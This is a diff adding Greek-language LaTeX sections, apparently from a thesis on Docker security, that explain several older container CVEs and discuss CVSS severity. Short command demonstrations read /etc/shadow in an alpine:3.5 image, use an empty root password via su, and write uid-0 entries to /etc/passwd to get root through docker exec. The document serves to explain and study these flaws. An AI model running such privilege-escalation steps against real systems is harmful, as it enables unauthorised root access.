@@ -905,6 +905,124 @@ binary} στον κεντρικό υπολογιστή. Ο χρήστης \textt
 εκτελεστεί το \textlatin{runC} (δηλ. όταν δημιουργείται ένα κοντέινερ ή
 εκτελείται το \texttt{\textlatin{docker exec}}), το αντικατασταθέν
 \textlatin{runC binary} εκτελείται αντ' αυτού. Αυτό, φυσικά, είναι επικίνδυνο
-γιατί επιτρέπει ένα κακόβουλο κοντέινερ να εκτελέσει κώδικα στον κεντρικό υπολογιστή.
+γιατί επιτρέπει ένα κακόβουλο κοντέινερ να εκτελέσει κώδικα στον κεντρικό
+υπολογιστή.
 
 \subsection{\textlatin{CVE–2019–5021}}
+
+Η εικόνα Docker για το \textlatin{Alpine Linux} (μία από τις πιο
+χρησιμοποιούμενες βασικές εικόνες) είχε
+ένα πρόβλημα όπου ο κωδικός πρόσβασης του χρήστη \texttt{\textlatin{root}} στο
+κοντέινερ παραμένει κενός.
+Στο \textlatin{Linux} είναι δυνατό να απενεργοποιήσετε έναν κωδικό πρόσβασης και
+να τον αφήσετε κενό. Ένας απενεργοποιημένος κωδικός πρόσβασης δεν μπορεί να
+χρησιμοποιηθεί, αλλά ένας κενός κωδικός πρόσβασης ισούται με μια κενή
+συμβολοσειρά. Αυτό επιτρέπει σε χρήστες που δεν είναι \texttt{\textlatin{root}}
+να αποκτήσουν δικαιώματα \texttt{\textlatin{root}} παρέχοντας μια κενή
+συμβολοσειρά.
+
+Είναι ακόμα δυνατή η χρήση των ευάλωτων εικόνων (\textlatin{alpine:3.3,
+alpine:3.4, alpine:3.5}. \\
+
+\texttt{\textlatin{(host)\$ docker run -it --rm alpine:3.5 cat /etc/shadow}}
+
+\texttt{\textlatin{root:::0:::::}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(host)\$ docker run -it --rm alpine:3.5 sh}}
+
+\texttt{\textlatin{(cont)\# apk add --no-cache linux-pam shadow}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(cont)\# adduser test}}
+
+\texttt{\textlatin{...}}
+
+\texttt{\textlatin{(cont)\# su test}}
+
+\texttt{\textlatin{Password:}}
+
+\texttt{\textlatin{(cont)\$ su root}}
+
+\texttt{\textlatin{(cont)\#}} \\
+
+\textbf{Σημείωση σχετικά με τη βαθμολογία \textlatin{CVSS} του
+\textlatin{CVE–2019–5021}} \\
+
+Αυτή η ευπάθεια έχει βαθμολογία \textlatin{CVSS} 9,8 (και 10 σε
+\textlatin{CVSS} 2)
+\footnote{\textlatin{https://nvd.nist.gov/vuln/detail/CVE-2019-5021}} από
+μέγιστη βαθμολογία 10. Μια τόσο υψηλή βαθμολογία \textlatin{CVSS} σημαίνει ότι
+αυτό λαμβάνεται υπόψη ως μια ευπάθεια εξαιρετικά υψηλού κινδύνου. Αλλά στην
+πραγματικότητα, αυτή η ευπάθεια είναι επικίνδυνη μόνο σε συγκεκριμένες
+περιπτώσεις.
+
+Ένας κενός κωδικός πρόσβασης \texttt{\textlatin{root}} ακούγεται επικίνδυνος,
+αλλά στην πραγματικότητα δεν είναι τόσο επικίνδυνο σε ένα απομονωμένο περιβάλλον
+(π.χ. ένα κοντέινερ) που λειτουργεί ως \texttt{\textlatin{root}} (μέσα στο
+κοντέινερ) από προεπιλογή. Αυτή η ευπάθεια είναι μόνο επικίνδυνη σε
+συγκεκριμένες περιπτώσεις.
+
+Για παράδειγμα, αν δημιουργήσουμε μια εικόνα \textlatin{Docker} βασισμένη στο
+\textlatin{alpine:3.5} που χρησιμοποιεί ένας χρήστης χωρίς
+\texttt{\textlatin{root}} από προεπιλογή. Εάν ένας επιτιθέμενος βρει έναν τρόπο
+να εκτελέσει κώδικα στο κοντέινερ, αυτή η ευπάθεια θα του επιτρέψει να
+κλιμακώσει τα προνόμιά του από απλό χρήστη σε \texttt{\textlatin{root}}, αλλά
+παρολαυτά ακόμα θα πρέπει ακόμα να βρει τρόπο να ξεφύγει από το κοντέινερ. Το να
+είναι κάποιος ικανός να εκτελέσει κώδικα ως \texttt{\textlatin{root}} θα τον
+βοηθήσει να ξεφύγει από το κοντέινερ, αλλά δεν το εγγυάται. Αυτό το παράδειγμα
+δείχνει ότι αυτή η ευπάθεια είναι επικίνδυνη, αλλά μόνο σε ένα σενάριο όπου
+είναι χρησιμοποιείται συναρτήσει άλλων ευπαθειών (\textlatin{chain
+vulnerabilities}).
+
+\subsection{\textlatin{CVE–2018–15664}}
+
+Βρέθηκε ένα σφάλμα στο \textlatin{Docker 18.06.1-ce-rc1} που επιτρέπει
+διεργασίες σε κοντέινερ να διαβάσουν και να γράψουν αρχεία στον κεντρικό
+υπολογιστή \cite{CVE-2018-15664-Openwall} \cite{CVE-2018-15664-Bugzilla}.
+Υπάρχει αρκετός χρόνος μεταξύ τον έλεγχο εάν ένας συμβολικός σύνδεσμος
+(\textlatin{symlink}) είναι συνδεδεμένος με ένας ασφαλές \textlatin{path} (εντός
+του κοντέινερ) και την πραγματική χρήση του συμβολικού συνδέσμου, ότι ο
+συμβολικός σύνδεσμος μπορεί να "δείχνει" σε άλλο αρχείο. Αυτό επιτρέπει σε ένα
+δοχείο να ξεκινά με ανάγνωση ή γραφή ένας συμβολικού συνδέσμου σε ένα αυθαίρετο
+μη σχετικό αρχείο στο κοντέινερ, αλλά στην πραγματικότητα
+να διαβάζει ή να γράφει ένα αρχείο στον κεντρικό υπολογιστή.
+
+\subsection{\textlatin{CVE–2018–9862}}
+
+Το \textlatin{Docker} προσπάθησε να ερμηνεύσει τις τιμές που δόθηκαν στο όρισμα
+\texttt{\textlatin{--user}} ως όνομα χρήστη πριν δοκιμαστούν ως \textlatin{user
+id} \cite{CVE-2018-9862-Github}. Αυτό μπορεί να το εκμεταλλευτεί κανείς
+χρησιμοποιώντας τη πρώτη καταχώρηση του \texttt{\textlatin{/etc/passwd}}. Αυτό
+επιτρέπει τη δημιουργία κακόβουλων εικόνων με χρήστες που έχουν δικαιώματα
+\texttt{\textlatin{root}}. \\
+
+\texttt{\textlatin{(host)\$ docker run --rm -ti ... ubuntu bash}}
+
+\texttt{\textlatin{(cont)\# echo "10:x:0:0:root:/root:/bin/bash" > /etc/passwd}}
+
+\texttt{\textlatin{(host)\$ docker exec -ti -u 10 hello bash}}
+
+\texttt{\textlatin{(cont)\# id}}
+
+\texttt{\textlatin{uid=0(10) gid=0(root) groups=0(root)}} \\
+
+\subsection{\textlatin{CVE–2016–3697}}
+
+Το \textlatin{Docker} πριν από την 1.11.2 προσπάθησε να ερμηνεύσει τις τιμές που
+δόθηκαν στο όρισμα \texttt{\textlatin{--user}} ως όνομα χρήστη πριν τις
+δοκιμάσει ως \textlatin{user id} \cite{CVE-2016-3697-Github}. Αυτό επιτρέπει
+δημιουργούνται κακόβουλες εικόνες με χρήστες που έχουν δικαιώματα
+\texttt{\textlatin{root}} όταν χρησιμοποιούνται. \\
+
+\texttt{\textlatin{(host)\$ docker run --rm -it --name=test ubuntu:latest /bin/bash}}
+
+\texttt{\textlatin{(cont)\# echo '31337:x:0:0:root:/root:/bin/bash' >> /etc/passwd}}
+
+\texttt{\textlatin{(host)\$ sudo docker exec -it -u 31337 test /bin/bash}}
+
+\texttt{\textlatin{(cont)\# id}}
+
+\texttt{\textlatin{uid=0(root) gid=0(root) groups=0(root)}} \\
